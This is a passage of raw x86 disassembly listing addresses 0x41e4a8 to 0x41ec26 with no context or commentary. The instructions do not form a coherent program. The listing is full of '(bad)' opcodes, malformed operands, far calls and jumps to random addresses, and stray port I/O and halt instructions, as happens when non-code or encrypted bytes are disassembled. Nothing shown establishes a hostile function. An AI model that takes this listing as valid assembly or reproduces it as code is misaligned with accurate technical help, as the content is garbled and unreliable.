  41e4a8:	lock jo 0x41e4e1
  41e4ab:	popa   
  41e4ac:	adc    eax,0x98534fc2
  41e4b1:	outs   dx,DWORD PTR ds:[esi]
  41e4b2:	enter  0xfecd,0x61
  41e4b6:	aas    
  41e4b7:	jg     0x41e449
  41e4b9:	(bad)  
  41e4ba:	into   
  41e4bb:	jns    0x41e522
  41e4bd:	add    DWORD PTR [eax+0x37],esi
  41e4c0:	sbb    edi,DWORD PTR cs:[eax]
  41e4c3:	adc    ch,BYTE PTR [esi]
  41e4c5:	fdivr  DWORD PTR [esi+0x4e2c2087]
  41e4cb:	mov    bl,0xb7
  41e4cd:	adc    eax,ebx
  41e4cf:	scas   eax,DWORD PTR es:[edi]
  41e4d0:	inc    ebp
  41e4d1:	jb     0x41e453
  41e4d3:	add    BYTE PTR [edx],al
  41e4d5:	pushf  
  41e4d6:	add    ebx,DWORD PTR [eax+eiz*1-0x4d10c2]
  41e4dd:	add    DWORD PTR [ecx+0x6e],0x60af188e
  41e4e4:	mov    eax,0x6bdf02e8
  41e4e9:	add    edx,DWORD PTR [edx+0x55e3ee24]
  41e4ef:	call   0xb927441e
  41e4f4:	dec    eax
  41e4f5:	lods   eax,DWORD PTR ds:[esi]
  41e4f6:	xlat   BYTE PTR ds:[ebx]
  41e4f7:	popa   
  41e4f8:	mov    al,0xe2
  41e4fa:	and    dh,BYTE PTR [esi+eax*8-0x5f]
  41e4fe:	jecxz  0x41e54e
  41e500:	test   BYTE PTR [edx+ecx*4-0x1d486659],bl
  41e507:	fidivr DWORD PTR [esi-0x69]
  41e50a:	scas   al,BYTE PTR es:[edi]
  41e50b:	lea    edi,[edi-0x23]
  41e50e:	es shr esp,0x1e
  41e512:	pop    eax
  41e513:	cld    
  41e514:	push   ds
  41e515:	idiv   eax
  41e517:	sbb    dh,BYTE PTR [edx]
  41e519:	xchg   ebp,eax
  41e51a:	push   edi
  41e51b:	xchg   esp,eax
  41e51c:	and    BYTE PTR [ecx],ch
  41e51e:	call   0x9dd:0xca6e30a7
  41e525:	rol    DWORD PTR [ebx],0x53
  41e528:	fsub   DWORD PTR [eax+0x680595d6]
  41e52e:	inc    edx
  41e52f:	rcl    DWORD PTR [edx+0x65],0x95
  41e533:	sar    BYTE PTR [eax-0x242a8a7],1
  41e539:	(bad)  
  41e53a:	fdiv   DWORD PTR [edx]
  41e53c:	clc    
  41e53d:	nop
  41e53e:	sub    DWORD PTR [edi+0x1d409ac7],esi
  41e544:	pop    esi
  41e545:	push   eax
  41e546:	cmp    dl,BYTE PTR [edi-0x759a8f19]
  41e54c:	outs   dx,DWORD PTR ds:[esi]
  41e54d:	pop    ss
  41e54e:	push   0x1bd51c05
  41e553:	scas   eax,DWORD PTR es:[edi]
  41e554:	sbb    al,cl
  41e556:	mov    dh,0x14
  41e558:	mov    ch,BYTE PTR [edx-0x319a2a73]
  41e55e:	scas   eax,DWORD PTR es:[edi]
  41e55f:	daa    
  41e560:	mov    al,ds:0xe107deab
  41e565:	mov    cl,0x77
  41e567:	push   0x2265955e
  41e56c:	push   cs
  41e56d:	sbb    ebp,DWORD PTR [eax-0x486eec73]
  41e573:	xchg   esp,eax
  41e574:	(bad)  
  41e575:	outs   dx,BYTE PTR ds:[esi]
  41e576:	add    DWORD PTR [esi+esi*4],ebx
  41e579:	(bad)  [esi-0x43]
  41e57c:	dec    ebx
  41e57d:	arpl   WORD PTR [ebx+0x55f72ec9],cx
  41e583:	adc    al,0xf7
  41e585:	pusha  
  41e586:	fcmovne st,st(2)
  41e588:	push   ebx
  41e589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e58a:	in     al,dx
  41e58b:	push   ebp
  41e58c:	jns    0x41e54a
  41e58e:	or     edx,edx
  41e590:	mov    al,ds:0xb6cb8b68
  41e595:	dec    edx
  41e596:	or     al,0x25
  41e598:	mov    ch,0xd4
  41e59a:	repnz fnstsw WORD PTR [ebx]
  41e59d:	loop   0x41e58c
  41e59f:	ret    
  41e5a0:	push   esp
  41e5a1:	mov    dl,0xfc
  41e5a3:	adc    eax,0xc62d13a1
  41e5a8:	xchg   di,ax
  41e5aa:	lds    ebp,FWORD PTR [edx-0x6c]
  41e5ad:	lods   al,BYTE PTR ds:[esi]
  41e5ae:	push   edi
  41e5af:	addr16 shl ebp,cl
  41e5b2:	mov    edx,0xb5cfb351
  41e5b7:	mov    eax,ds:0x9d3c9ebf
  41e5bc:	rcr    BYTE PTR [ecx+0x6be65777],0xd8
  41e5c3:	xchg   DWORD PTR [edx-0x7b1a484a],edi
  41e5c9:	push   ss
  41e5ca:	jae    0x41e607
  41e5cc:	push   ebx
  41e5cd:	test   al,0xe2
  41e5cf:	cmp    ch,BYTE PTR [ecx-0x45]
  41e5d2:	lock scas al,BYTE PTR es:[edi]
  41e5d4:	stos   BYTE PTR es:[edi],al
  41e5d5:	iret   
  41e5d6:	pop    esp
  41e5d7:	jg     0x41e5a5
  41e5d9:	test   ch,cl
  41e5db:	stos   BYTE PTR es:[edi],al
  41e5dc:	xchg   ebx,eax
  41e5dd:	addr16 add eax,0x3b81f1de
  41e5e3:	call   0x4433b5c6
  41e5e8:	xor    bh,BYTE PTR [ebx-0x4e492bc8]
  41e5ee:	stc    
  41e5ef:	fdiv   QWORD PTR [ebx-0x39817447]
  41e5f5:	jae    0x41e5ec
  41e5f7:	in     al,dx
  41e5f8:	repz inc eax
  41e5fa:	das    
  41e5fb:	call   0x67d5:0x7206c880
  41e602:	push   eax
  41e603:	ins    BYTE PTR es:[edi],dx
  41e604:	scas   eax,DWORD PTR es:[edi]
  41e605:	aam    0x1f
  41e607:	jnp    0x41e678
  41e609:	(bad)  
  41e60a:	cmp    eax,0xcf23b807
  41e60f:	in     eax,0xee
  41e611:	push   cs
  41e612:	mov    al,0x61
  41e614:	into   
  41e615:	cld    
  41e616:	popf   
  41e617:	lds    ebp,FWORD PTR [edi-0x46]
  41e61a:	jns    0x41e5b0
  41e61c:	ror    BYTE PTR [ecx-0x5c5f2449],cl
  41e622:	js     0x41e5a6
  41e624:	sub    ebp,DWORD PTR [ebp+0x56]
  41e627:	loopne 0x41e65d
  41e629:	lahf   
  41e62a:	mov    eax,ds:0x1892a3e2
  41e62f:	sbb    eax,0x966866d8
  41e634:	ret    0xf6d8
  41e637:	adc    ebx,ebp
  41e639:	mov    ds:0x9b6b377a,al
  41e63e:	shl    DWORD PTR [ecx+0x5c],cl
  41e641:	(bad)
  41e645:	or     BYTE PTR [esi-0x20],dh
  41e648:	dec    ebx
  41e649:	push   esi
  41e64a:	test   eax,0x412b10d7
  41e64f:	in     al,0x1d
  41e651:	inc    ecx
  41e652:	fist   DWORD PTR [edi+0x4768366a]
  41e658:	and    esp,esi
  41e65a:	enter  0xc6f0,0x99
  41e65e:	mov    bh,0x7e
  41e660:	inc    edx
  41e661:	retf   
  41e662:	ss mov ah,0xc
  41e665:	or     esi,esi
  41e667:	fdivr  QWORD PTR [ecx-0x36]
  41e66a:	fisub  WORD PTR [edx]
  41e66c:	xchg   DWORD PTR [ebx],esp
  41e66e:	test   DWORD PTR [ebp-0x3b210aa0],ebp
  41e674:	pop    eax
  41e675:	(bad)
  41e678:	mov    esi,0xd21574aa
  41e67d:	inc    ecx
  41e67e:	ds jle 0x41e6ef
  41e681:	pop    ss
  41e682:	inc    esi
  41e683:	in     eax,0x28
  41e685:	inc    ebp
  41e686:	jl     0x41e64f
  41e688:	mov    DWORD PTR [ebx+0x3d087a23],esi
  41e68e:	xchg   edx,eax
  41e68f:	pop    ebx
  41e690:	loop   0x41e66e
  41e692:	pushf  
  41e693:	pop    ecx
  41e694:	xchg   ebp,eax
  41e695:	lea    ebx,[ecx+0x51]
  41e698:	mov    al,0xe6
  41e69a:	mov    al,ds:0x4241e7
  41e69f:	scas   eax,DWORD PTR es:[edi]
  41e6a0:	pop    ecx
  41e6a1:	lds    esp,FWORD PTR [ebp+0x10c0f6a5]
  41e6a7:	cs enter 0x4bd6,0xea
  41e6ac:	push   ecx
  41e6ad:	shl    DWORD PTR [eax],1
  41e6af:	and    esp,DWORD PTR [ebx-0x67]
  41e6b2:	(bad)  
  41e6b4:	push   ecx
  41e6b5:	int    0x15
  41e6b7:	test   DWORD PTR [edx+0x494fe4f8],ecx
  41e6bd:	int3   
  41e6be:	jae    0x41e6be
  41e6c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6c1:	fmul   DWORD PTR ds:0x2ddc349
  41e6c7:	mov    esi,0xe777de48
  41e6cc:	mov    WORD PTR [ebx],ss
  41e6ce:	retf   
  41e6cf:	clc    
  41e6d0:	cwde   
  41e6d1:	loop   0x41e6bb
  41e6d3:	push   eax
  41e6d4:	xchg   BYTE PTR [eax+0x39],bl
  41e6d7:	add    ebx,ecx
  41e6d9:	scas   eax,DWORD PTR es:[edi]
  41e6da:	xor    eax,0xe68a4a00
  41e6df:	lds    edi,FWORD PTR [esi]
  41e6e1:	mov    al,0x35
  41e6e3:	xchg   DWORD PTR [ebx-0x80],ebp
  41e6e6:	cwde   
  41e6e7:	jecxz  0x41e736
  41e6e9:	adc    al,0xab
  41e6eb:	rcr    DWORD PTR [ebp*4-0x29d73e01],cl
  41e6f2:	and    al,0xf6
  41e6f4:	or     esi,DWORD PTR [edi+eax*2-0x2]
  41e6f8:	inc    ebp
  41e6f9:	repz sbb eax,0x1ef09d98
  41e6ff:	and    ecx,esp
  41e701:	mov    dl,0xab
  41e703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e704:	sbb    BYTE PTR [ebp+ebp*4-0x73],bh
  41e708:	mov    esp,0x49b4ea25
  41e70d:	call   0xec463baa
  41e712:	sub    al,0xce
  41e714:	frndint 
  41e716:	push   ss
  41e717:	pop    edx
  41e718:	ja     0x41e6b4
  41e71a:	jmp    0xb21b:0x12be3529
  41e721:	loopne 0x41e792
  41e723:	stc    
  41e724:	sub    dl,0x1d
  41e727:	pushf  
  41e728:	shl    bh,1
  41e72a:	push   ss
  41e72b:	xchg   BYTE PTR [edx+0x614a4c15],ch
  41e731:	mov    DWORD PTR [edi+ebx*8],ecx
  41e734:	jo     0x41e763
  41e736:	test   al,0x5
  41e738:	popa   
  41e739:	(bad)  
  41e73a:	aaa    
  41e73b:	xor    al,0x1a
  41e73d:	or     eax,0xf31a9e00
  41e742:	inc    eax
  41e743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e744:	int3   
  41e745:	sub    edi,DWORD PTR es:[bx+di+0x7b55]
  41e74b:	push   eax
  41e74c:	xor    BYTE PTR [ebp+0x1b1f1371],cl
  41e752:	out    0x9,al
  41e754:	xchg   bx,ax
  41e756:	stos   DWORD PTR es:[edi],eax
  41e757:	ss call 0xaaa2:0xd3e0e518
  41e75f:	icebp  
  41e760:	std    
  41e761:	std    
  41e762:	mov    ebx,DWORD PTR [edx]
  41e764:	or     al,0xde
  41e766:	shl    DWORD PTR [ebx-0x1e],1
  41e769:	mov    eax,0x8ba41680
  41e76e:	inc    edx
  41e76f:	push   ds
  41e770:	jp     0x41e7c1
  41e772:	in     eax,0xa
  41e774:	mov    eax,ds:0x7fba682
  41e779:	xchg   DWORD PTR [eax],ebx
  41e77b:	out    0xfd,eax
  41e77d:	cmp    al,0xd6
  41e77f:	ror    BYTE PTR [edx-0x21fbdc1c],cl
  41e785:	jbe    0x41e753
  41e787:	ret    
  41e788:	sti    
  41e789:	dec    esp
  41e78a:	mov    ebx,0xad607ffb
  41e78f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e790:	pop    es
  41e791:	cmp    BYTE PTR [esi+eiz*8-0x2e47eaab],dh
  41e798:	outs   dx,DWORD PTR ds:[esi]
  41e799:	add    BYTE PTR [eax-0x4766bd63],0xb2
  41e7a0:	push   cs
  41e7a1:	xchg   esp,eax
  41e7a2:	jo     0x41e7eb
  41e7a4:	adc    ebx,DWORD PTR [ecx-0x4937d889]
  41e7aa:	sbb    eax,0x1a039cd1
  41e7af:	sub    DWORD PTR [eax+0x15833499],0x8b31b357
  41e7b9:	adc    al,0x40
  41e7bb:	enter  0x60b8,0x68
  41e7bf:	adc    DWORD PTR [eax],esi
  41e7c1:	sti    
  41e7c2:	sahf   
  41e7c3:	mov    esi,DWORD PTR [esi+0x4944ee32]
  41e7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7ca:	lods   eax,DWORD PTR ds:[esi]
  41e7cb:	out    dx,eax
  41e7cc:	mov    edx,0x847d0876
  41e7d1:	add    ecx,edi
  41e7d3:	loop   0x41e844
  41e7d5:	push   0xb346616f
  41e7da:	rol    BYTE PTR [eax+0x1],0x52
  41e7de:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7e0:	test   DWORD PTR [ebp+0x2b9e33cf],0x6e3e025b
  41e7ea:	sbb    al,0x2
  41e7ec:	add    ah,bh
  41e7ee:	add    BYTE PTR [ecx],ah
  41e7f0:	inc    ecx
  41e7f1:	div    BYTE PTR [eax-0x32]
  41e7f4:	mov    ch,0x1a
  41e7f6:	inc    ebx
  41e7f7:	out    0xa9,eax
  41e7f9:	xor    ch,ah
  41e7fb:	xor    eax,0xbfdf546
  41e800:	pop    ebp
  41e801:	repz add DWORD PTR ds:0x38405252,0x35648734
  41e80c:	bound  edi,QWORD PTR [edx-0x2faca43d]
  41e812:	dec    ecx
  41e813:	popf   
  41e814:	cwde   
  41e815:	test   eax,0x2a4f7ede
  41e81a:	imul   eax,ecx,0x9c2e4dc6
  41e820:	sbb    edx,DWORD PTR [edi]
  41e822:	xchg   esp,eax
  41e823:	adc    ch,BYTE PTR [edi-0x35]
  41e826:	cmc    
  41e827:	sub    al,0xd
  41e829:	xor    eax,0xd1fa927
  41e82e:	mov    bh,0xf5
  41e830:	mov    esp,0x9c9c4d8e
  41e835:	sbb    eax,0xce4a2a47
  41e83a:	mov    edx,0x49bcef2
  41e83f:	inc    eax
  41e840:	and    bl,dl
  41e842:	cmp    BYTE PTR [eax],bl
  41e844:	dec    eax
  41e845:	jns    0x41e815
  41e847:	add    dh,BYTE PTR [eax+ebp*4+0x4da0df5]
  41e84e:	mov    BYTE PTR [edi+0x46],dl
  41e851:	into   
  41e852:	pop    edi
  41e853:	cmp    eax,0x71ccf992
  41e858:	scas   al,BYTE PTR es:[edi]
  41e859:	mov    edi,0xfe89bd21
  41e85e:	in     al,0x5c
  41e860:	push   ebx
  41e861:	fwait
  41e862:	scas   al,BYTE PTR es:[edi]
  41e863:	xchg   ecx,eax
  41e864:	pop    ebp
  41e865:	fcmovnbe st,st(0)
  41e867:	inc    ebx
  41e868:	mov    edx,0x44b599cc
  41e86d:	jle    0x41e832
  41e86f:	and    eax,edx
  41e871:	push   ebp
  41e872:	hlt    
  41e873:	cmp    ah,ah
  41e875:	call   0xf2cef813
  41e87a:	pop    ss
  41e87b:	ret    
  41e87c:	sub    bh,BYTE PTR [edx-0x3a122f99]
  41e882:	jmp    0x2878:0xd35a28d6
  41e889:	mov    al,ds:0x5cdb2acb
  41e88e:	pop    esi
  41e88f:	jb     0x41e824
  41e891:	push   eax
  41e892:	adc    eax,0x71f32fd9
  41e897:	dec    edx
  41e898:	mov    al,0x9d
  41e89a:	xchg   edx,eax
  41e89b:	xor    ebx,0xffffffdc
  41e89e:	out    dx,eax
  41e89f:	pop    esi
  41e8a0:	sub    DWORD PTR [ecx-0x57d06395],0xffffffbf
  41e8a7:	or     DWORD PTR [esi],edx
  41e8a9:	idiv   DWORD PTR [eax]
  41e8ab:	pop    edx
  41e8ac:	inc    esp
  41e8ad:	rcr    DWORD PTR [eax-0x51],1
  41e8b0:	je     0x41e87a
  41e8b2:	fcmovnb st,st(1)
  41e8b4:	jns    0x41e912
  41e8b6:	and    BYTE PTR [ebp-0x78014215],0xf0
  41e8bd:	push   cs
  41e8be:	jnp    0x41e92a
  41e8c0:	popf   
  41e8c1:	das    
  41e8c2:	cmp    eax,0xca3cb903
  41e8c7:	inc    eax
  41e8c8:	push   ebx
  41e8c9:	inc    esp
  41e8ca:	dec    edi
  41e8cb:	cld    
  41e8cc:	jbe    0x41e923
  41e8ce:	cmp    bh,al
  41e8d0:	adc    ch,BYTE PTR ds:[ebx+0x731e27c8]
  41e8d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d8:	scas   al,BYTE PTR es:[edi]
  41e8d9:	sub    eax,0xf58069ab
  41e8de:	jl     0x41e952
  41e8e0:	rcr    BYTE PTR [edx],cl
  41e8e2:	sbb    ebp,eax
  41e8e4:	icebp  
  41e8e5:	sbb    edx,DWORD PTR [edi+edx*1]
  41e8e8:	icebp  
  41e8e9:	hlt    
  41e8ea:	inc    esp
  41e8eb:	xor    bl,BYTE PTR [eax]
  41e8ed:	aam    0xa7
  41e8ef:	inc    ebp
  41e8f0:	(bad)  
  41e8f1:	iret   
  41e8f2:	jno    0x41e95a
  41e8f4:	jne    0x41e95a
  41e8f6:	test   eax,0x91c2e19b
  41e8fb:	dec    ebp
  41e8fc:	jp     0x41e945
  41e8fe:	push   es
  41e8ff:	lds    esi,FWORD PTR [ebp-0x77]
  41e902:	xchg   ecx,eax
  41e903:	xchg   ecx,eax
  41e904:	xchg   ebx,eax
  41e905:	jmp    0x41e95f
  41e907:	or     cl,dl
  41e909:	mov    dl,0xc2
  41e90b:	call   0x84f1:0x6a2cfd0
  41e912:	jae    0x41e895
  41e914:	inc    ecx
  41e915:	jmp    0x41e938
  41e917:	xlat   BYTE PTR ds:[ebx]
  41e918:	ret    
  41e919:	out    dx,eax
  41e91a:	mov    ?,WORD PTR [eax+0x5c0eeda1]
  41e920:	les    esi,FWORD PTR [ebx-0x12]
  41e923:	cld    
  41e924:	icebp  
  41e925:	ja     0x41e951
  41e927:	repz mov ebp,0x5da9621
  41e92d:	sub    eax,0xab614bd4
  41e932:	inc    edi
  41e933:	push   ebx
  41e934:	jecxz  0x41e99a
  41e936:	sar    edx,cl
  41e938:	shl    DWORD PTR [ebx-0x27377570],0x19
  41e93f:	stc    
  41e940:	xacquire xchg DWORD PTR [ecx+0x6aba7103],esi
  41e947:	dec    ebx
  41e948:	adc    BYTE PTR [edi+eax*4-0x52c44bd4],dl
  41e94f:	push   cs
  41e950:	adc    eax,0x1d46f79e
  41e955:	sbb    ebx,DWORD PTR [ebp+0x7f]
  41e958:	sub    al,0x6
  41e95a:	(bad)  
  41e95b:	fisubr WORD PTR [ebx-0x11c778bf]
  41e961:	mov    WORD PTR [ebx-0x66],?
  41e964:	fstp   DWORD PTR [ecx+0x31397f31]
  41e96a:	(bad)  
  41e96b:	loopne 0x41e904
  41e96d:	inc    ebx
  41e96e:	dec    edi
  41e96f:	push   ss
  41e970:	jge    0x41e9a0
  41e972:	jns    0x41e943
  41e974:	inc    ecx
  41e975:	imul   edi,DWORD PTR [ebx],0x24210e68
  41e97b:	pop    ds
  41e97c:	push   ebp
  41e97d:	mov    dl,0xb6
  41e97f:	sbb    bh,BYTE PTR [ecx]
  41e981:	or     eax,0xe4c905d2
  41e986:	push   ecx
  41e987:	add    al,BYTE PTR [eax-0x3c41d3de]
  41e98d:	(bad)  
  41e98e:	test   BYTE PTR [edi-0x34],0x47
  41e992:	mov    eax,0x23b62d9f
  41e997:	sbb    edi,ecx
  41e999:	(bad)  
  41e99a:	xchg   edx,eax
  41e99b:	cmp    esi,DWORD PTR [ecx-0x3ccabcf6]
  41e9a1:	in     eax,dx
  41e9a2:	and    eax,0x57aafc49
  41e9a7:	jnp    0x41e99b
  41e9a9:	push   ds
  41e9aa:	sub    DWORD PTR [eax+0x54],0x63
  41e9ae:	outs   dx,DWORD PTR ds:[esi]
  41e9af:	xchg   edi,eax
  41e9b0:	aad    0x93
  41e9b2:	out    0x29,eax
  41e9b4:	dec    esi
  41e9b5:	(bad)  
  41e9b6:	xchg   ecx,eax
  41e9b7:	inc    edi
  41e9b8:	inc    ebx
  41e9b9:	mov    ds:0x9dd109ea,eax
  41e9be:	or     BYTE PTR [ebp-0x1f969437],ah
  41e9c4:	dec    ebx
  41e9c5:	push   0x1507958e
  41e9ca:	mov    ah,0x77
  41e9cc:	pop    ecx
  41e9cd:	jnp    0x41e958
  41e9cf:	add    ebx,DWORD PTR [edx+esi*8+0x5e48ae71]
  41e9d6:	xchg   BYTE PTR [edi+0x73],ch
  41e9d9:	(bad)  
  41e9da:	mov    edi,0x18ce3e7b
  41e9df:	ds out 0xaa,al
  41e9e2:	xchg   ah,ch
  41e9e4:	call   0xa0ad:0xe87dd9a2
  41e9eb:	xor    BYTE PTR [ecx],0xd8
  41e9ee:	mov    esi,0x229e9192
  41e9f3:	pop    edx
  41e9f4:	xchg   ebx,eax
  41e9f5:	mov    esi,0x274edc3f
  41e9fa:	cmp    BYTE PTR [ebp+0x3d],bl
  41e9fd:	sahf   
  41e9fe:	sub    esi,DWORD PTR [edx+ecx*2]
  41ea01:	js     0x41e9b4
  41ea03:	pop    esp
  41ea04:	cdq    
  41ea05:	adc    ebp,DWORD PTR [eax-0x1dcd2a8]
  41ea0b:	ja     0x41ea7a
  41ea0d:	mov    edi,0x74ccec12
  41ea12:	jb     0x41ea52
  41ea14:	inc    edi
  41ea15:	jge    0x41e9ab
  41ea17:	into   
  41ea18:	inc    ebp
  41ea19:	es jae 0x41e9f6
  41ea1c:	rep outs dx,DWORD PTR ds:[esi]
  41ea1e:	call   0x8718b398
  41ea23:	punpcklbw mm3,DWORD PTR [ecx+0x525ce1df]
  41ea2a:	test   BYTE PTR [ecx+0x4b],dh
  41ea2d:	xlat   BYTE PTR ds:[ebx]
  41ea2e:	call   0x99d9bfab
  41ea33:	out    dx,al
  41ea34:	dec    esi
  41ea35:	(bad)  
  41ea36:	outs   dx,DWORD PTR ds:[esi]
  41ea37:	test   BYTE PTR [ebx],dl
  41ea39:	in     al,0x45
  41ea3b:	inc    edx
  41ea3c:	icebp  
  41ea3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea3e:	pop    esp
  41ea3f:	mov    ds:0x9291d3ed,al
  41ea44:	(bad)  [eax+0x4d]
  41ea47:	dec    ebx
  41ea48:	jmp    0x41eaab
  41ea4a:	mov    edi,0xb30dd697
  41ea4f:	mov    DWORD PTR [edi-0x2c0f37cf],esi
  41ea55:	jmp    0x9dda:0x6bce9bf6
  41ea5c:	xor    al,BYTE PTR ds:0xdcadb018
  41ea62:	cdq    
  41ea63:	sub    eax,0x76f10f56
  41ea68:	cmp    eax,0x9bd6e2a4
  41ea6d:	pushf  
  41ea6e:	sti    
  41ea6f:	mov    edx,ds
  41ea71:	stos   BYTE PTR es:[edi],al
  41ea72:	xchg   BYTE PTR [ebx+ebp*4-0xa8a74a9],bl
  41ea79:	inc    ecx
  41ea7a:	xlat   BYTE PTR ds:[ebx]
  41ea7b:	add    ebx,DWORD PTR [ebp+0x5aaec552]
  41ea81:	xchg   BYTE PTR [ecx-0x7],cl
  41ea84:	pop    ds
  41ea85:	mov    edi,0x214ccce
  41ea8a:	icebp  
  41ea8b:	push   esp
  41ea8c:	dec    esi
  41ea8d:	push   eax
  41ea8e:	mov    edi,0xe7780eb9
  41ea93:	lods   al,BYTE PTR ds:[esi]
  41ea94:	jno    0x41ea80
  41ea96:	jl     0x41ea39
  41ea98:	cld    
  41ea99:	addr16 inc eax
  41ea9b:	cld    
  41ea9c:	imul   ecx,ebp,0xffffff92
  41ea9f:	rcr    BYTE PTR [esi],cl
  41eaa1:	in     eax,dx
  41eaa2:	es test ah,dl
  41eaa5:	cmp    DWORD PTR [ecx+0x6366d3c6],esi
  41eaab:	in     eax,0xe4
  41eaad:	cmp    BYTE PTR [ecx+0xd],ah
  41eab0:	sar    ecx,0x3c
  41eab3:	mov    al,ds:0xa50434bb
  41eab8:	jnp    0x41ea8d
  41eaba:	cmp    ch,BYTE PTR [esi+0x32]
  41eabd:	mov    ch,0x6f
  41eabf:	xchg   edi,eax
  41eac0:	xchg   BYTE PTR [ebx+eiz*4-0x55745e8a],dh
  41eac7:	cmc    
  41eac8:	mov    eax,ds:0xf4807242
  41eacd:	data16 jecxz 0x41eaa9
  41ead0:	xchg   edi,eax
  41ead1:	imul   esp,DWORD PTR [eax+0x4e],0xffffffc4
  41ead5:	inc    edi
  41ead6:	dec    edx
  41ead7:	loop   0x41ead8
  41ead9:	lea    eax,[ebx-0x6bb0ba11]
  41eadf:	mov    bh,0x4c
  41eae1:	dec    eax
  41eae2:	jge    0x41eaeb
  41eae4:	fstp   QWORD PTR [edi]
  41eae6:	sbb    edx,DWORD PTR [edx+0xc2a27f0]
  41eaec:	xchg   ebx,eax
  41eaed:	jmp    0x41eb0e
  41eaef:	in     al,dx
  41eaf0:	dec    edi
  41eaf1:	mov    WORD PTR [ecx+0x5c],?
  41eaf4:	xor    ch,BYTE PTR [ebx+0x5b]
  41eaf7:	cmp    BYTE PTR [edi-0x1b],0x2b
  41eafb:	push   ecx
  41eafc:	inc    edx
  41eafd:	sub    ebp,DWORD PTR [edx+0x5a]
  41eb00:	mov    ecx,0xb5289127
  41eb05:	or     eax,0xd62eb44d
  41eb0a:	ret    
  41eb0b:	cmp    al,0x9a
  41eb0d:	jle    0x41ea8f
  41eb0f:	xor    ebx,DWORD PTR [edi+0x5162989b]
  41eb15:	ror    BYTE PTR [esi-0x4b7209d],1
  41eb1b:	xchg   ecx,eax
  41eb1c:	pop    edx
  41eb1d:	xchg   edx,eax
  41eb1e:	mov    edi,0x29f9b6e
  41eb23:	into   
  41eb24:	xlat   BYTE PTR ds:[ebx]
  41eb25:	in     eax,dx
  41eb26:	hlt    
  41eb27:	lahf   
  41eb28:	sbb    BYTE PTR [esi+edi*4+0x3342eed9],bl
  41eb2f:	cmp    ecx,DWORD PTR [edi]
  41eb31:	xchg   ebx,eax
  41eb32:	les    edi,FWORD PTR [edx]
  41eb34:	jne    0x41eb7a
  41eb36:	fnstsw WORD PTR [ecx+0x60]
  41eb39:	lea    esi,[edi-0x4a]
  41eb3c:	sub    eax,0xfa613200
  41eb41:	mov    al,BYTE PTR ds:0x2beb81fd
  41eb47:	mov    dh,0xba
  41eb49:	pop    ecx
  41eb4a:	sub    BYTE PTR [eax],al
  41eb4c:	aaa    
  41eb4d:	pop    ss
  41eb4e:	jge    0x41ebc7
  41eb50:	fdivr  st(4),st
  41eb52:	push   cs
  41eb53:	mov    dh,0xa0
  41eb55:	repz sub eax,0x8dff8e43
  41eb5b:	adc    bl,BYTE PTR [edi-0x734a72de]
  41eb61:	rcr    DWORD PTR [edx-0x42],1
  41eb64:	and    ebp,DWORD PTR [esi-0x60b6c477]
  41eb6a:	mov    bh,0x2c
  41eb6c:	pop    esp
  41eb6d:	out    0x56,al
  41eb6f:	pusha  
  41eb70:	jmp    0x78d8:0x2641d009
  41eb77:	xlat   BYTE PTR ds:[ebx]
  41eb78:	in     al,dx
  41eb79:	cld    
  41eb7a:	add    esp,DWORD PTR [esi]
  41eb7c:	das    
  41eb7d:	cmp    dh,BYTE PTR [edx+0x457e743e]
  41eb83:	mov    bh,0xc8
  41eb85:	fcom   st(7)
  41eb87:	sub    al,0xa6
  41eb89:	ret    
  41eb8a:	into   
  41eb8b:	dec    ebx
  41eb8c:	pop    esi
  41eb8d:	add    al,0x1f
  41eb8f:	jmp    0x41ebe1
  41eb91:	into   
  41eb92:	xchg   edi,eax
  41eb93:	call   0x10a51bc7
  41eb98:	das    
  41eb99:	xor    edx,0x7f
  41eb9c:	popa   
  41eb9d:	adc    DWORD PTR [eax+edx*2],edi
  41eba0:	cmp    al,0x2f
  41eba2:	(bad)  
  41eba3:	retf   0xe471
  41eba6:	loop   0x41ebf7
  41eba8:	outs   dx,DWORD PTR ds:[esi]
  41eba9:	dec    edi
  41ebaa:	xor    DWORD PTR [ecx-0x1046397e],0x64b87e00
  41ebb4:	push   0x20
  41ebb6:	sti    
  41ebb7:	cmp    DWORD PTR [edx],ecx
  41ebb9:	jb     0x41eb5b
  41ebbb:	pop    es
  41ebbc:	popf   
  41ebbd:	fcmovne st,st(0)
  41ebbf:	pop    ebx
  41ebc0:	sub    BYTE PTR [eax+edi*4],bh
  41ebc3:	cmc    
  41ebc4:	jbe    0x41ec45
  41ebc6:	jmp    0x1a83ce51
  41ebcb:	loopne 0x41ec1b
  41ebcd:	inc    eax
  41ebce:	pop    esp
  41ebcf:	shld   DWORD PTR [ebx-0x5e9af91],eax,cl
  41ebd6:	and    eax,0xb668924a
  41ebdb:	lea    ebx,[ebp-0x3d]
  41ebde:	or     eax,0xc9c10280
  41ebe3:	sub    ebx,esi
  41ebe5:	and    BYTE PTR [ecx],bh
  41ebe7:	mov    ah,0x5
  41ebe9:	mov    ds:0x267e2495,eax
  41ebee:	pop    esi
  41ebef:	pop    esi
  41ebf0:	sub    edi,0xd9bbf107
  41ebf6:	sub    BYTE PTR [ebx],dl
  41ebf8:	mov    ah,0x8
  41ebfa:	into   
  41ebfb:	ret    
  41ebfc:	jmp    0x41ec55
  41ebfe:	push   0x24
  41ec00:	in     eax,dx
  41ec01:	jmp    0x41ec60
  41ec03:	inc    esp
  41ec04:	jmp    0x3499f5dd
  41ec09:	mov    DWORD PTR [ebx],ebp
  41ec0b:	mov    esp,eax
  41ec0d:	xor    edx,DWORD PTR [ebx]
  41ec0f:	out    0x77,eax
  41ec11:	shl    BYTE PTR [eax-0x37],0x7f
  41ec15:	adc    ebp,DWORD PTR [ebx]
  41ec17:	add    esi,DWORD PTR [ebx-0x27]
  41ec1a:	push   edx
  41ec1b:	mov    esp,ebx
  41ec1d:	out    dx,al
  41ec1e:	jne    0x41ec7a
  41ec20:	jge    0x41ec72
  41ec22:	or     esp,ecx
  41ec24:	mov    bh,0xd3
  41ec26:	inc    edx
